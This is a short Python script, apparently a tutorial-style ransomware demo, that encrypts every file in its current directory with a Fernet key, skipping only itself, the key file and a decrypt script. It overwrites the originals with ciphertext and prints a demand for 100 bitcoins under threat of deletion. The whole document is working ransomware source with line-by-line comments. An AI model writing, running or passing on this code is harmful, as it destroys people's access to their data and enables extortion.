
import os # for importing all the files through built in library
from cryptography.fernet import Fernet   # built in function for generating key

files = [] # to gather all the files in the directory

for file in os.listdir():
 # to list up all the files present in the current directory
	if file == "voldermort.py" or file== "thekey.key" or file=="decrypt.py":
# leaving the file voldermort behind in the list itself and key file
		continue
	if os.path.isfile(file):
# checking if it's a directory then leaving it behind and gathering   rest
		files.append(file )

print(files)
#printing all the files present in the directory
key = Fernet.generate_key()
# generating a particular encrypted key for files
with open("thekey.key","wb") as thekey:
# using open funtion opening thekey.key in writebinary mode as the key
	thekey.write(key)
#write the variable key (actual key) to thekey


for file in files:
#this "for" loop will open every file then read all the contents in it
#then write the file back with encrypted data
	with open(file,"rb") as thefile:
		contents = thefile.read()
#reading the files and saving the content of that files in "contents"
	contents_encrypted = Fernet(key).encrypt(contents)
#encrypting data from files and saving it in "contents_encrypted"
	with open(file,"wb") as  thefile:
		thefile.write(contents_encrypted)
#writing encrypted data back into the file


print("All of your files have been encrypted!!! Send me 100 bitcoins or i'll delete them in 24 hours ")
